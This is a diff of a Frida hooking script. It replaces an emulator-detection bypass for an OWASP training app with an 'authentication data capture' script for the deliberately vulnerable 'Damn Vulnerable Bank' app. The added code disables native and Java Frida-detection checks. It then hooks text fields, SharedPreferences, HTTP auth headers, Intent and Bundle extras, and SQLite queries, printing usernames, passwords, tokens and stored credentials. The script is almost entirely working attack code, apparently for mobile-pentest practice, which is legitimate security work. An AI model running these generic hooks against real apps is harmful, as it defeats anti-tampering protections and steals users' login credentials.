@@ -1,150 +1,196 @@
 Java.perform(function() {
-    console.log("[+] Starting emulator detection bypass...");
+    console.log("[*] Starting authentication data capture script...");
     
-    try {
-        // Hook the main emulator detection method
-        var EmulatorDetectionActivity = Java.use("owasp.sat.agoat.EmulatorDetectionActivity");
-        EmulatorDetectionActivity.isEmulator.implementation = function() {
-            console.log("[+] EmulatorDetectionActivity.isEmulator() called - bypassing");
-            return false;
-        };
-        console.log("[+] Hooked EmulatorDetectionActivity.isEmulator()");
-    } catch (e) {
-        console.log("[-] Failed to hook EmulatorDetectionActivity.isEmulator(): " + e);
-    }
-
-    // Common Android emulator detection methods
-    try {
-        var Build = Java.use("android.os.Build");
-        Build.FINGERPRINT.value = "google/sdk_gphone_x86/generic_x86:10/QSR1.190920.001/5891938:user/release-keys";
-        Build.MODEL.value = "Pixel 3";
-        Build.MANUFACTURER.value = "Google";
-        Build.BRAND.value = "google";
-        Build.DEVICE.value = "blueline";
-        Build.PRODUCT.value = "blueline";
-        Build.HARDWARE.value = "blueline";
-        Build.ID.value = "QP1A.190711.020";
-        Build.BOARD.value = "sdm845";
-        console.log("[+] Modified Build properties");
-    } catch (e) {
-        console.log("[-] Failed to modify Build properties: " + e);
-    }
-
-    // Hook TelephonyManager for IMEI/device ID checks
-    try {
-        var TelephonyManager = Java.use("android.telephony.TelephonyManager");
-        TelephonyManager.getDeviceId.overload().implementation = function() {
-            console.log("[+] TelephonyManager.getDeviceId() called - returning fake IMEI");
-            return "358240051111110";
-        };
-        
-        TelephonyManager.getDeviceId.overload('int').implementation = function(slotIndex) {
-            console.log("[+] TelephonyManager.getDeviceId(int) called - returning fake IMEI");
-            return "358240051111110";
-        };
-        
-        TelephonyManager.getSubscriberId.implementation = function() {
-            console.log("[+] TelephonyManager.getSubscriberId() called - returning fake IMSI");
-            return "310260000000000";
-        };
-        
-        TelephonyManager.getLine1Number.implementation = function() {
-            console.log("[+] TelephonyManager.getLine1Number() called - returning fake number");
-            return "15551234567";
-        };
-        
-        TelephonyManager.getNetworkOperatorName.implementation = function() {
-            console.log("[+] TelephonyManager.getNetworkOperatorName() called");
-            return "T-Mobile";
-        };
-        
-        TelephonyManager.getSimOperatorName.implementation = function() {
-            console.log("[+] TelephonyManager.getSimOperatorName() called");
-            return "T-Mobile";
-        };
-        
-        console.log("[+] Hooked TelephonyManager methods");
-    } catch (e) {
-        console.log("[-] Failed to hook TelephonyManager: " + e);
-    }
-
-    // Hook Settings.Secure for Android ID
-    try {
-        var Settings = Java.use("android.provider.Settings$Secure");
-        Settings.getString.implementation = function(resolver, name) {
-            if (name == "android_id") {
-                console.log("[+] Settings.Secure.getString() called for android_id - returning fake ID");
-                return "9774d56d682e549c";
+    // First, bypass native Frida detection
+    var nativeLib = Module.findExportByName("libfrida-check.so", "Java_com_app_damnvulnerablebank_FridaCheckJNI_fridaCheck");
+    if (nativeLib) {
+        console.log("[*] Found Frida detection function, bypassing...");
+        Interceptor.attach(nativeLib, {
+            onEnter: function(args) {
+                console.log("[*] Native Frida check called - bypassing");
+            },
+            onLeave: function(retval) {
+                console.log("[*] Original return value: " + retval);
+                retval.replace(0); // Return 0 to indicate no Frida detected
+                console.log("[*] Modified return value: " + retval);
             }
-            return this.getString(resolver, name);
-        };
-        console.log("[+] Hooked Settings.Secure.getString()");
-    } catch (e) {
-        console.log("[-] Failed to hook Settings.Secure: " + e);
+        });
     }
-
-    // Hook SystemProperties for emulator-specific properties
+    
+    // Hook Java-level Frida check as well
     try {
-        var SystemProperties = Java.use("android.os.SystemProperties");
-        SystemProperties.get.overload('java.lang.String').implementation = function(key) {
-            var result = this.get(key);
-            if (key.indexOf("ro.kernel.qemu") !== -1 || 
-                key.indexOf("ro.bootmode") !== -1 ||
-                key.indexOf("ro.hardware") !== -1) {
-                console.log("[+] SystemProperties.get() called for " + key + " - original: " + result);
-                if (key == "ro.hardware") {
-                    return "qcom";
-                }
-                if (key == "ro.bootmode") {
-                    return "unknown";
-                }
-                return "";
-            }
-            return result;
+        var FridaCheckJNI = Java.use("com.app.damnvulnerablebank.FridaCheckJNI");
+        FridaCheckJNI.fridaCheck.implementation = function() {
+            console.log("[*] Java Frida check bypassed");
+            return 0;
         };
-
-        SystemProperties.get.overload('java.lang.String', 'java.lang.String').implementation = function(key, def) {
-            var result = this.get(key, def);
-            if (key.indexOf("ro.kernel.qemu") !== -1 || 
-                key.indexOf("ro.bootmode") !== -1 ||
-                key.indexOf("ro.hardware") !== -1) {
-                console.log("[+] SystemProperties.get() called for " + key + " with default - original: " + result);
-                if (key == "ro.hardware") {
-                    return "qcom";
-                }
-                if (key == "ro.bootmode") {
-                    return "unknown";
-                }
-                return def;
-            }
-            return result;
-        };
-        console.log("[+] Hooked SystemProperties.get()");
     } catch (e) {
-        console.log("[-] Failed to hook SystemProperties: " + e);
+        console.log("[-] Could not hook Java Frida check: " + e);
     }
-
-    // Hook File operations for common emulator detection files
+    
+    // Hook EditText to capture username/password input
     try {
-        var File = Java.use("java.io.File");
-        File.exists.implementation = function() {
-            var name = this.getName();
-            var path = this.getAbsolutePath();
+        var EditText = Java.use("android.widget.EditText");
+        EditText.getText.implementation = function() {
+            var result = this.getText();
+            var hint = "";
+            try {
+                hint = this.getHint();
+                if (hint) hint = hint.toString();
+            } catch (e) {}
             
-            if (path.indexOf("goldfish") !== -1 || 
-                path.indexOf("genymotion") !== -1 ||
-                path.indexOf("andy") !== -1 ||
-                path.indexOf("nox") !== -1 ||
-                name == "qemu-props") {
-                console.log("[+] File.exists() called for emulator file: " + path + " - returning false");
-                return false;
+            if (result && result.toString().length > 0) {
+                console.log("[*] EditText content captured:");
+                console.log("    Hint: " + hint);
+                console.log("    Text: " + result.toString());
             }
-            return this.exists();
+            return result;
         };
-        console.log("[+] Hooked File.exists()");
     } catch (e) {
-        console.log("[-] Failed to hook File.exists(): " + e);
+        console.log("[-] Could not hook EditText: " + e);
     }
-
-    console.log("[+] Emulator detection bypass setup complete");
+    
+    // Hook SharedPreferences to capture stored credentials
+    try {
+        var SharedPrefsImpl = Java.use("android.app.SharedPreferencesImpl");
+        var EditorImpl = Java.use("android.app.SharedPreferencesImpl$EditorImpl");
+        
+        EditorImpl.putString.implementation = function(key, value) {
+            console.log("[*] SharedPreferences putString:");
+            console.log("    Key: " + key);
+            console.log("    Value: " + value);
+            return this.putString(key, value);
+        };
+        
+        SharedPrefsImpl.getString.implementation = function(key, defValue) {
+            var result = this.getString(key, defValue);
+            if (result && result !== defValue) {
+                console.log("[*] SharedPreferences getString:");
+                console.log("    Key: " + key);
+                console.log("    Value: " + result);
+            }
+            return result;
+        };
+    } catch (e) {
+        console.log("[-] Could not hook SharedPreferences: " + e);
+    }
+    
+    // Hook HTTP requests to capture authentication data
+    try {
+        var URL = Java.use("java.net.URL");
+        var HttpURLConnection = Java.use("java.net.HttpURLConnection");
+        
+        HttpURLConnection.setRequestProperty.implementation = function(key, value) {
+            if (key.toLowerCase().includes("auth") || key.toLowerCase().includes("token")) {
+                console.log("[*] HTTP Authentication header:");
+                console.log("    " + key + ": " + value);
+            }
+            return this.setRequestProperty(key, value);
+        };
+        
+        HttpURLConnection.getOutputStream.implementation = function() {
+            var stream = this.getOutputStream();
+            console.log("[*] HTTP request to: " + this.getURL());
+            return stream;
+        };
+    } catch (e) {
+        console.log("[-] Could not hook HTTP connections: " + e);
+    }
+    
+    // Hook Intent extras for authentication data
+    try {
+        var Intent = Java.use("android.content.Intent");
+        
+        Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(key, value) {
+            if (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
+                key.toLowerCase().includes("auth") || key.toLowerCase().includes("login")) {
+                console.log("[*] Intent extra (auth-related):");
+                console.log("    Key: " + key);
+                console.log("    Value: " + value);
+            }
+            return this.putExtra(key, value);
+        };
+        
+        Intent.getStringExtra.implementation = function(key) {
+            var result = this.getStringExtra(key);
+            if (result && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
+                         key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
+                console.log("[*] Intent getStringExtra (auth-related):");
+                console.log("    Key: " + key);
+                console.log("    Value: " + result);
+            }
+            return result;
+        };
+    } catch (e) {
+        console.log("[-] Could not hook Intent: " + e);
+    }
+    
+    // Hook Bundle for authentication data
+    try {
+        var Bundle = Java.use("android.os.Bundle");
+        
+        Bundle.putString.implementation = function(key, value) {
+            if (key && value && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
+                               key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
+                console.log("[*] Bundle putString (auth-related):");
+                console.log("    Key: " + key);
+                console.log("    Value: " + value);
+            }
+            return this.putString(key, value);
+        };
+        
+        Bundle.getString.implementation = function(key) {
+            var result = this.getString(key);
+            if (result && key && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
+                                key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
+                console.log("[*] Bundle getString (auth-related):");
+                console.log("    Key: " + key);
+                console.log("    Value: " + result);
+            }
+            return result;
+        };
+    } catch (e) {
+        console.log("[-] Could not hook Bundle: " + e);
+    }
+    
+    // Hook SQLite database operations for stored credentials
+    try {
+        var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
+        
+        SQLiteDatabase.execSQL.overload('java.lang.String').implementation = function(sql) {
+            if (sql.toLowerCase().includes("user") || sql.toLowerCase().includes("pass") || 
+                sql.toLowerCase().includes("auth") || sql.toLowerCase().includes("login")) {
+                console.log("[*] SQLite execSQL (auth-related):");
+                console.log("    SQL: " + sql);
+            }
+            return this.execSQL(sql);
+        };
+        
+        SQLiteDatabase.rawQuery.implementation = function(sql, selectionArgs) {
+            if (sql.toLowerCase().includes("user") || sql.toLowerCase().includes("pass") || 
+                sql.toLowerCase().includes("auth") || sql.toLowerCase().includes("login")) {
+                console.log("[*] SQLite rawQuery (auth-related):");
+                console.log("    SQL: " + sql);
+                if (selectionArgs) {
+                    console.log("    Args: " + selectionArgs.toString());
+                }
+            }
+            return this.rawQuery(sql, selectionArgs);
+        };
+    } catch (e) {
+        console.log("[-] Could not hook SQLiteDatabase: " + e);
+    }
+    
+    // Hook app-specific classes for authentication
+    try {
+        var MainActivity = Java.use("com.app.damnvulnerablebank.MainActivity");
+        MainActivity.loginPage.implementation = function(view) {
+            console.log("[*] Login page accessed");
+            return this.loginPage(view);
+        };
+    } catch (e) {
+        console.log("[-] Could not hook MainActivity.loginPage: " + e);
+    }
+    
+    console.log("[*] Authentication data capture script loaded successfully");
 });
